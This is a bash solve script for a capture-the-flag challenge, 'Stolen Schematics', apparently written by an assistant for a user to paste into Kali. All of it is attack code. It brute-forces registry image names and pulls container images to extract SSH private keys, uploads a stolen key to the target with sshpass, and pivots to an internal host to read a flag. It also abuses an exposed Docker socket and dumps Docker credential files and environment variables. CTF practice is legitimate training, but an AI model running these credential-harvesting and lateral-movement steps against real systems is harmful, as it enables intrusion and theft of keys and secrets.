#!/bin/bash
################################################################################
# STOLEN SCHEMATICS - SIMPLE SOLVE SCRIPT
# Just copy and paste this ENTIRE script into your Kali terminal
################################################################################

PORT=32887
PASS="reyalp"
HOST="instance.ctf.tdho.st"

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║        STOLEN SCHEMATICS - AUTOMATED SOLVER                  ║"
echo "║        Port: $PORT | Password: $PASS                         ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# Method 1: Try to find image via GitHub API
echo "[1/5] Checking GitHub API for public packages..."
IMAGE_NAME=$(curl -s "https://api.github.com/orgs/talldwarfhosting/packages?package_type=container" 2>/dev/null | grep -o '"name":"[^"]*"' | head -1 | cut -d'"' -f4)

if [ ! -z "$IMAGE_NAME" ]; then
    echo "✓ Found image name: $IMAGE_NAME"
    IMAGE="ghcr.io/talldwarfhosting/$IMAGE_NAME:latest"
    echo "[*] Trying to pull: $IMAGE"
    if docker pull $IMAGE 2>&1 | grep -q "Downloaded\|up to date\|Digest"; then
        echo "✓ Image pulled successfully!"
        echo "[*] Extracting SSH key..."
        docker run --rm $IMAGE cat /root/.ssh/id_rsa > /tmp/key 2>/dev/null || \
        docker run --rm $IMAGE cat /home/player/.ssh/id_rsa > /tmp/key 2>/dev/null
        
        if [ -s /tmp/key ]; then
            chmod 600 /tmp/key
            echo "✓ Key extracted! Uploading to instance..."
            sshpass -p "$PASS" scp -o StrictHostKeyChecking=no -P $PORT /tmp/key player@$HOST:/tmp/key
            echo "[*] Attempting to get flag..."
            sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -p $PORT player@$HOST \
                'chmod 600 /tmp/key && ssh -i /tmp/key -o StrictHostKeyChecking=no player@172.27.0.1 "cat /etc/flag.txt"'
            exit 0
        fi
    fi
fi

# Method 2: Brute force common image names
echo ""
echo "[2/5] Brute forcing common image names..."
for name in mc-server minecraft-server game-server server stolen-schematics schematics minecraft mc game challenge tdho; do
    for tag in latest v1 v1.0 v0.1 main master 2024 2025 prod dev; do
        IMAGE="ghcr.io/talldwarfhosting/$name:$tag"
        if timeout 3 docker manifest inspect $IMAGE >/dev/null 2>&1; then
            echo "✓✓✓ FOUND: $IMAGE"
            docker pull $IMAGE
            docker run --rm $IMAGE cat /root/.ssh/id_rsa > /tmp/key 2>/dev/null || \
            docker run --rm $IMAGE cat /home/player/.ssh/id_rsa > /tmp/key 2>/dev/null
            
            if [ -s /tmp/key ]; then
                chmod 600 /tmp/key
                sshpass -p "$PASS" scp -o StrictHostKeyChecking=no -P $PORT /tmp/key player@$HOST:/tmp/key
                sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -p $PORT player@$HOST \
                    'chmod 600 /tmp/key && ssh -i /tmp/key -o StrictHostKeyChecking=no player@172.27.0.1 "cat /etc/flag.txt"'
                exit 0
            fi
        fi
    done
done

# Method 3: Search inside the instance container
echo ""
echo "[3/5] Searching for keys inside instance..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -p $PORT player@$HOST << 'REMOTECMD'
# Find all SSH keys
for key in $(find / -name "id_rsa" -o -name "*.pem" 2>/dev/null); do
    echo "[*] Found key: $key"
    chmod 600 $key 2>/dev/null
    if timeout 3 ssh -i $key -o StrictHostKeyChecking=no player@172.27.0.1 "cat /etc/flag.txt" 2>/dev/null; then
        exit 0
    fi
done
REMOTECMD

# Method 4: Check if Docker socket is accessible
echo ""
echo "[4/5] Checking Docker socket access..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -p $PORT player@$HOST << 'REMOTECMD'
if [ -S /var/run/docker.sock ]; then
    echo "[*] Docker socket found!"
    docker images 2>/dev/null
    # Try to extract from running containers
    for cid in $(docker ps -q 2>/dev/null); do
        docker cp $cid:/root/.ssh/id_rsa /tmp/extracted_key 2>/dev/null
        if [ -f /tmp/extracted_key ]; then
            chmod 600 /tmp/extracted_key
            ssh -i /tmp/extracted_key -o StrictHostKeyChecking=no player@172.27.0.1 "cat /etc/flag.txt" 2>/dev/null
        fi
    done
fi
REMOTECMD

# Method 5: Deep reconnaissance
echo ""
echo "[5/5] Running deep reconnaissance..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -p $PORT player@$HOST << 'REMOTECMD'
echo "=== Environment variables ==="
env | grep -i -E "image|docker|registry|ghcr"

echo "=== Network info ==="
ip addr
cat /etc/hosts

echo "=== Home directory ==="
ls -la ~

echo "=== Processes ==="
ps aux | grep -i docker | head -10

echo "=== Mounted filesystems ==="
mount | grep -v "proc\|sys\|dev"

echo "=== Checking common locations ==="
cat ~/.dockercfg 2>/dev/null
cat ~/.docker/config.json 2>/dev/null
cat /etc/docker/daemon.json 2>/dev/null
REMOTECMD

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "If you see a flag above, you're done!"
echo "Otherwise, please share the output so I can analyze it."
echo "═══════════════════════════════════════════════════════════════"
